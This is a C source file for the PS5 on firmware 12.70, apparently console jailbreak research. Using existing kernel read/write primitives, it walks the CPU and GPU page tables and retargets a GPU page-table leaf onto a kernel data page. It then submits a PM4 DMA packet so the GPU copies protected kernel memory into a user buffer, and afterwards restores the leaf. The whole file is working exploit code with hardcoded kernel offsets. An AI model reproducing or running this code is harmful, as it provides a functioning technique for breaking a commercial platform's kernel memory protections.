#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#include <ps5/kernel.h>
#include <ps5/klog.h>

#include "kdlsym.h"
#include "offsets/12_70_candidate.h"

/* Temporarily retarget one fresh GPU source leaf to a verified kernel-data page. */
#define FW_1270             0x12700000U
#define DATA_GVMSPACE_OFF   0x2E7E570ULL
#define GVM_ENTRY_SIZE      0x100ULL
#define GVM_ENTRY_COUNT     16U
#define BUFFER_SIZE         0x200000ULL
#define COPY_OFFSET         0x1000ULL
#define COPY_SIZE           0x1000U
#define MAX_PHYSICAL_PA     0x400000000ULL
#define GPU_ADDR_MASK       0x0000FFFFFFFFFFC0ULL
#define GPU_ADDR_2M_MASK    0x0000FFFFFFE00000ULL
#define GPU_VALID           1ULL
#define GPU_IS_PTE          (1ULL << 54)
#define GPU_BIT50           (1ULL << 50)
#define CPU_PRESENT         0x001ULL
#define CPU_LARGE           0x080ULL
#define CPU_FRAME_4K        0x000FFFFFFFFFF000ULL
#define CPU_FRAME_2M        0x000FFFFFFFE00000ULL
#define CPU_FRAME_1G        0x000FFFFFC0000000ULL
#define PROT_GPU_READ       0x10
#define PROT_GPU_WRITE      0x20
#define MAP_NO_COALESCE     0x00400000
#define DMEM_TYPE_GARLIC    0xb
#define GPU_SUBMIT_IOCTL    0xC0108102U
#define PM4_TYPE3           3U
#define PM4_OPCODE_DMA_DATA 0x50U
#define PM4_SHADER_COMPUTE  1U

typedef int (*fn_alloc_dmem)(off_t, off_t, size_t, size_t, int, off_t *);
typedef int (*fn_map_dmem)(void **, size_t, int, int, off_t, size_t);
typedef int (*fn_release_dmem)(off_t, size_t);

typedef struct {
  unsigned char prefix[45];
  char message[3075];
} notify_request_t;
extern int sceKernelSendNotificationRequest(int, notify_request_t *, size_t, int);

struct gc_submit {
  uint32_t pipe_id;
  uint32_t count;
  uint64_t cmd_buf_ptr;
};

typedef struct {
  uint8_t *va;
  off_t offset;
  int allocated;
  int mapped;
} direct_buffer_t;

typedef struct {
  uint64_t raw;
  uint64_t entry_pa;
} gpu_leaf_t;

static uint8_t expected[COPY_SIZE];

static void notify_result(const char *message)
{
  notify_request_t req = {0};
  snprintf(req.message, sizeof(req.message), "%s", message);
  sceKernelSendNotificationRequest(0, &req, sizeof(req), 0);
}

static int read_qword(uint64_t kva, uint64_t *out)
{
  *out = 0;
  return kernel_copyout((intptr_t)kva, out, sizeof(*out));
}

static int read_phys(uint64_t dmap, uint64_t pa, uint64_t *out)
{
  if (pa < 0x1000 || pa > MAX_PHYSICAL_PA - sizeof(*out) || (pa & 7))
    return -1;
  return read_qword(dmap + pa, out);
}

static int get_dmap(uint64_t text, uint64_t *dmap, uint64_t *cr3_out)
{
  uint64_t pmap = text + g_sym_map_1270[KERNEL_SYM_PMAP_STORE];
  uint64_t pml4 = 0, cr3 = 0;
  if (read_qword(pmap + 0x20, &pml4) != 0 ||
      read_qword(pmap + 0x28, &cr3) != 0 ||
      !pml4 || !cr3 || pml4 <= cr3 ||
      (pml4 & 0xfff) || (cr3 & 0xfff) || cr3 >= MAX_PHYSICAL_PA)
    return -1;
  *dmap = pml4 - cr3;
  if ((*dmap >> 48) != 0xffffULL || (*dmap & 0x3fffffffULL))
    return -1;
  *cr3_out = cr3;
  return 0;
}

static int next_cpu_table(uint64_t e, uint64_t *pa)
{
  *pa = e & CPU_FRAME_4K;
  return (e & CPU_PRESENT) && !(e & CPU_LARGE) &&
         *pa >= 0x1000 && *pa < MAX_PHYSICAL_PA ? 0 : -1;
}

static int cpu_translate(uint64_t dmap, uint64_t cr3, uint64_t va,
                         uint64_t *out_pa)
{
  uint64_t e = 0, table = cr3;
  if (read_phys(dmap, table + (((va >> 39) & 0x1ff) * 8), &e) != 0 ||
      next_cpu_table(e, &table) != 0)
    return -1;
  if (read_phys(dmap, table + (((va >> 30) & 0x1ff) * 8), &e) != 0 ||
      !(e & CPU_PRESENT))
    return -1;
  if (e & CPU_LARGE) {
    *out_pa = (e & CPU_FRAME_1G) | (va & 0x3fffffffULL);
    return 0;
  }
  if (next_cpu_table(e, &table) != 0 ||
      read_phys(dmap, table + (((va >> 21) & 0x1ff) * 8), &e) != 0 ||
      !(e & CPU_PRESENT))
    return -1;
  if (e & CPU_LARGE) {
    *out_pa = (e & CPU_FRAME_2M) | (va & 0x1fffffULL);
    return 0;
  }
  if (next_cpu_table(e, &table) != 0 ||
      read_phys(dmap, table + (((va >> 12) & 0x1ff) * 8), &e) != 0 ||
      !(e & CPU_PRESENT))
    return -1;
  *out_pa = (e & CPU_FRAME_4K) | (va & 0xfffULL);
  return 0;
}

static int gpu_leaf(uint64_t gvmspace, uint64_t dmap, unsigned vmid,
                    uint64_t gva, gpu_leaf_t *leaf)
{
  uint64_t row = gvmspace + vmid * GVM_ENTRY_SIZE;
  uint64_t state = 0, dir = 0, e4 = 0, e3 = 0, e2 = 0;
  if (read_qword(row, &state) != 0 ||
      read_qword(row + 0x38, &dir) != 0 ||
      (uint32_t)state == 0x20 || !dir ||
      (dir >> 48) != 0xffffULL || (dir & 0xfff))
    return 0;
  if (read_qword(dir + (((gva >> 39) & 0x1ff) * 8), &e4) != 0 ||
      !(e4 & GPU_VALID))
    return 0;
  uint64_t pa = (e4 & GPU_ADDR_MASK) + (((gva >> 30) & 0x1ff) * 8);
  if (read_phys(dmap, pa, &e3) != 0 || !(e3 & GPU_VALID))
    return 0;
  pa = (e3 & GPU_ADDR_MASK) + (((gva >> 21) & 0x1ff) * 8);
  if (read_phys(dmap, pa, &e2) != 0 ||
      !(e2 & GPU_VALID) || !(e2 & GPU_IS_PTE))
    return 0;
  leaf->raw = e2;
  leaf->entry_pa = pa;
  return 1;
}

static int alloc_map(direct_buffer_t *b, fn_alloc_dmem allocate, fn_map_dmem map)
{
  int rc = allocate(0, MAX_PHYSICAL_PA, BUFFER_SIZE, BUFFER_SIZE,
                    DMEM_TYPE_GARLIC, &b->offset);
  if (rc != 0)
    return rc;
  b->allocated = 1;
  int prot = PROT_READ | PROT_WRITE | PROT_GPU_READ | PROT_GPU_WRITE;
  void *va = NULL;
  rc = map(&va, BUFFER_SIZE, prot, MAP_NO_COALESCE,
           b->offset, BUFFER_SIZE);
  if (rc != 0 || !va)
    return rc ? rc : -1;
  b->va = (uint8_t *)va;
  b->mapped = 1;
  return 0;
}

static void build_dma_data(uint32_t *pkt, uint64_t src, uint64_t dst)
{
  pkt[0] = ((PM4_TYPE3 & 3U) << 30) | ((5U & 0x3fffU) << 16)
         | ((PM4_OPCODE_DMA_DATA & 0xffU) << 8)
         | ((PM4_SHADER_COMPUTE & 1U) << 1);
  pkt[1] = (1U << 31) | (2U << 25) | (1U << 27)
         | (2U << 13) | (1U << 15);
  pkt[2] = (uint32_t)src;
  pkt[3] = (uint32_t)(src >> 32);
  pkt[4] = (uint32_t)dst;
  pkt[5] = (uint32_t)(dst >> 32);
  pkt[6] = COPY_SIZE & 0x1fffffU;
}

static void build_desc(uint64_t *desc, uint64_t cmd_gva)
{
  desc[0] = ((cmd_gva & 0xffffffffULL) << 32) | 0xC0023F00ULL;
  desc[1] = (7ULL << 32) | ((cmd_gva >> 32) & 0xffffULL);
}

int main(void)
{
  int result = 1, gc = -1, submitted = 0;
  int restore_needed = 0;
  direct_buffer_t bufs[3] = {0};
  fn_alloc_dmem allocate = NULL;
  fn_map_dmem map = NULL;
  fn_release_dmem release = NULL;
  uint32_t fw = kernel_get_fw_version();
  uint64_t text = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
  uint64_t data = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
  uint64_t dmap = 0, cr3 = 0, target_pa = 0;
  uint64_t victim_entry_pa = 0, old_leaf = 0;
  uint64_t idt = text + g_sym_map_1270[KERNEL_SYM_IDT_ARRAY];

  if ((fw & 0xffff0000U) != FW_1270 || !text ||
      data <= text || data - text != 0xD50000ULL ||
      idt != data + 0x2E88300ULL ||
      idt - 0x9D90ULL != data + DATA_GVMSPACE_OFF ||
      get_dmap(text, &dmap, &cr3) != 0) {
    klog_printf("GVMKNOWN1270,1,stop,stage=preflight,fw=0x%08x\n", fw);
    return 1;
  }
  klog_printf("GVMKNOWN1270,1,start,fw=0x%08x,data=0x%016" PRIx64 "\n",
              fw, data);

  if (cpu_translate(dmap, cr3, data, &target_pa) != 0 ||
      target_pa < 0x1000 || target_pa > MAX_PHYSICAL_PA - COPY_SIZE ||
      (target_pa & 0xfff) ||
      (target_pa & 0x1fffffULL) > BUFFER_SIZE - COPY_SIZE ||
      kernel_copyout((intptr_t)data, expected, COPY_SIZE) != 0) {
    klog_printf("GVMKNOWN1270,1,stop,stage=target-translate\n");
    goto done;
  }
  uint8_t alias[COPY_SIZE];
  if (kernel_copyout((intptr_t)(dmap + target_pa), alias, COPY_SIZE) != 0 ||
      memcmp(expected, alias, COPY_SIZE) != 0) {
    klog_printf("GVMKNOWN1270,1,stop,stage=target-alias\n");
    goto done;
  }
  klog_printf("GVMKNOWN1270,1,target,pa=0x%016" PRIx64
              ",within_2m=0x%05" PRIx64 ",alias_match=1\n",
              target_pa, target_pa & 0x1fffffULL);

  allocate = (fn_alloc_dmem)dlsym(RTLD_DEFAULT, "sceKernelAllocateDirectMemory");
  map = (fn_map_dmem)dlsym(RTLD_DEFAULT, "sceKernelMapDirectMemory");
  release = (fn_release_dmem)dlsym(RTLD_DEFAULT, "sceKernelReleaseDirectMemory");
  if (!allocate || !map || !release) {
    klog_printf("GVMKNOWN1270,1,stop,stage=symbols\n");
    goto done;
  }
  gc = open("/dev/gc", O_RDWR);
  if (gc < 0)
    gc = open("/dev/gc0", O_RDWR);
  if (gc < 0) {
    klog_printf("GVMKNOWN1270,1,stop,stage=device,errno=%d\n", errno);
    goto done;
  }
  for (unsigned i = 0; i < 3; i++) {
    int rc = alloc_map(&bufs[i], allocate, map);
    klog_printf("GVMKNOWN1270,1,buffer,index=%u,result=%d,va=0x%016" PRIx64
                ",offset=0x%016" PRIx64 "\n", i, rc,
                (uint64_t)(uintptr_t)bufs[i].va, (uint64_t)bufs[i].offset);
    if (rc != 0)
      goto done;
    if (((uintptr_t)bufs[i].va & (BUFFER_SIZE - 1)) != 0) {
      klog_printf("GVMKNOWN1270,1,stop,stage=buffer-align,index=%u\n", i);
      goto done;
    }
  }

  uint64_t gvmspace = data + DATA_GVMSPACE_OFF;
  unsigned found_vmid = GVM_ENTRY_COUNT;
  for (unsigned vm = 0; vm < GVM_ENTRY_COUNT; vm++) {
    gpu_leaf_t leaves[3] = {0};
    unsigned matches = 0;
    for (unsigned i = 0; i < 3; i++)
      matches += gpu_leaf(gvmspace, dmap, vm,
                          (uint64_t)(uintptr_t)bufs[i].va, &leaves[i]);
    if (matches != 3)
      continue;
    klog_printf("GVMKNOWN1270,1,vm,index=%u,leaf0=0x%016" PRIx64
                ",leaf1=0x%016" PRIx64 ",leaf2=0x%016" PRIx64
                ",victim_entry_pa=0x%016" PRIx64 "\n",
                vm, leaves[0].raw, leaves[1].raw, leaves[2].raw,
                leaves[0].entry_pa);
    if ((leaves[0].raw & GPU_ADDR_2M_MASK) == (leaves[1].raw & GPU_ADDR_2M_MASK) ||
        (leaves[0].raw & GPU_ADDR_2M_MASK) == (leaves[2].raw & GPU_ADDR_2M_MASK) ||
        (leaves[1].raw & GPU_ADDR_2M_MASK) == (leaves[2].raw & GPU_ADDR_2M_MASK) ||
        leaves[0].entry_pa == leaves[1].entry_pa ||
        leaves[0].entry_pa == leaves[2].entry_pa) {
      klog_printf("GVMKNOWN1270,1,stop,stage=aliased-buffers\n");
      goto done;
    }
    if (found_vmid != GVM_ENTRY_COUNT) {
      klog_printf("GVMKNOWN1270,1,stop,stage=multiple-vmids\n");
      goto done;
    }
    found_vmid = vm;
    old_leaf = leaves[0].raw;
    victim_entry_pa = leaves[0].entry_pa;
  }
  if (found_vmid == GVM_ENTRY_COUNT) {
    klog_printf("GVMKNOWN1270,1,stop,stage=no-vmid\n");
    goto done;
  }
  if (found_vmid != 6 ||
      (old_leaf & 0xfffULL) != 0x4f7ULL ||
      !(old_leaf & GPU_IS_PTE) ||
      (old_leaf & GPU_ADDR_2M_MASK) < MAX_PHYSICAL_PA ||
      (victim_entry_pa & ~0xfffULL) == (target_pa & ~0xfffULL)) {
    klog_printf("GVMKNOWN1270,1,stop,stage=leaf-invariant,vmid=%u,old=0x%016" PRIx64
                ",entry_pa=0x%016" PRIx64 "\n",
                found_vmid, old_leaf, victim_entry_pa);
    goto done;
  }

  uint8_t *dst = bufs[1].va + COPY_OFFSET;
  memset(dst, 0xa5, COPY_SIZE);
  memset(bufs[2].va, 0, 0x110);
  uint64_t src_gva = (uint64_t)(uintptr_t)bufs[0].va +
                     (target_pa & 0x1fffffULL);
  uint64_t dst_gva = (uint64_t)(uintptr_t)dst;
  uint64_t cmd_gva = (uint64_t)(uintptr_t)bufs[2].va;
  build_dma_data((uint32_t *)bufs[2].va, src_gva, dst_gva);
  build_desc((uint64_t *)(bufs[2].va + 0x100), cmd_gva);

  uint64_t check_leaf = 0;
  if (victim_entry_pa < 0x1000 ||
      victim_entry_pa > MAX_PHYSICAL_PA - sizeof(check_leaf) ||
      read_phys(dmap, victim_entry_pa, &check_leaf) != 0 ||
      check_leaf != old_leaf || (old_leaf & GPU_BIT50)) {
    klog_printf("GVMKNOWN1270,1,stop,stage=leaf-recheck,raw=0x%016" PRIx64 "\n",
                check_leaf);
    goto done;
  }
  uint64_t new_leaf = (old_leaf & ~GPU_ADDR_2M_MASK)
                    | (target_pa & GPU_ADDR_2M_MASK) | GPU_BIT50;
  if (new_leaf == old_leaf) {
    klog_printf("GVMKNOWN1270,1,stop,stage=leaf-unchanged\n");
    goto done;
  }
  klog_printf("GVMKNOWN1270,1,retarget,entry_pa=0x%016" PRIx64
              ",old=0x%016" PRIx64 ",new=0x%016" PRIx64 "\n",
              victim_entry_pa, old_leaf, new_leaf);
  restore_needed = 1;
  int wr = kernel_setlong((intptr_t)(dmap + victim_entry_pa), new_leaf);
  uint64_t observed_leaf = 0;
  int rr = read_phys(dmap, victim_entry_pa, &observed_leaf);
  klog_printf("GVMKNOWN1270,1,retarget_result,write=%d,read=%d,observed=0x%016" PRIx64
              "\n", wr, rr, observed_leaf);
  if (wr != 0 || rr != 0 || observed_leaf != new_leaf)
    goto done;
  __sync_synchronize();

  struct gc_submit sub = {0, 1, (uint64_t)(uintptr_t)(bufs[2].va + 0x100)};
  int rc = ioctl(gc, GPU_SUBMIT_IOCTL, &sub);
  submitted = rc == 0;
  klog_printf("GVMKNOWN1270,1,submit,result=%d,errno=%d,vmid=%u,bytes=%u\n",
              rc, rc == 0 ? 0 : errno, found_vmid, COPY_SIZE);
  if (rc != 0)
    goto done;

  unsigned copied = 0;
  for (unsigned poll = 0; poll < 200; poll++) {
    __sync_synchronize();
    if (memcmp(expected, dst, COPY_SIZE) == 0) {
      copied = 1;
      klog_printf("GVMKNOWN1270,1,compare,match=1,poll=%u\n", poll);
      result = 0;
      break;
    }
    usleep(10000);
  }
  if (!copied) {
    unsigned first_diff = 0;
    while (first_diff < COPY_SIZE && expected[first_diff] == dst[first_diff])
      first_diff++;
    if (first_diff < COPY_SIZE)
      klog_printf("GVMKNOWN1270,1,compare,match=0,first_diff=%u,expected=%02x,got=%02x\n",
                  first_diff, expected[first_diff], dst[first_diff]);
  }

done:
  if (restore_needed) {
    uint64_t observed = 0;
    int restored = 0;
    for (unsigned attempt = 0; attempt < 3; attempt++) {
      int wr = kernel_setlong((intptr_t)(dmap + victim_entry_pa), old_leaf);
      int rr = read_phys(dmap, victim_entry_pa, &observed);
      klog_printf("GVMKNOWN1270,1,restore,attempt=%u,write=%d,read=%d"
                  ",observed=0x%016" PRIx64 "\n", attempt, wr, rr, observed);
      if (wr == 0 && rr == 0 && observed == old_leaf) {
        __sync_synchronize();
        restored = 1;
        break;
      }
    }
    if (!restored)
      result = 1;
  }
  if (submitted)
    usleep(300000);
  if (gc >= 0)
    close(gc);
  for (unsigned i = 0; i < 3; i++) {
    if (bufs[i].mapped) {
      int rc = munmap(bufs[i].va, BUFFER_SIZE);
      klog_printf("GVMKNOWN1270,1,cleanup,index=%u,munmap=%d,errno=%d\n",
                  i, rc, rc == 0 ? 0 : errno);
      if (rc != 0)
        result = 1;
    }
    if (bufs[i].allocated) {
      int rc = release(bufs[i].offset, BUFFER_SIZE);
      klog_printf("GVMKNOWN1270,1,cleanup,index=%u,release=%d\n", i, rc);
      if (rc != 0)
        result = 1;
    }
  }
  klog_printf("GVMKNOWN1270,1,end,%s\n", result == 0 ? "ok" : "stop");
  notify_result(result == 0 ? "12.70 GPU known-data read complete; see GVMKNOWN1270 log"
                            : "12.70 GPU known-data read stopped; see GVMKNOWN1270 log");
  return result;
}
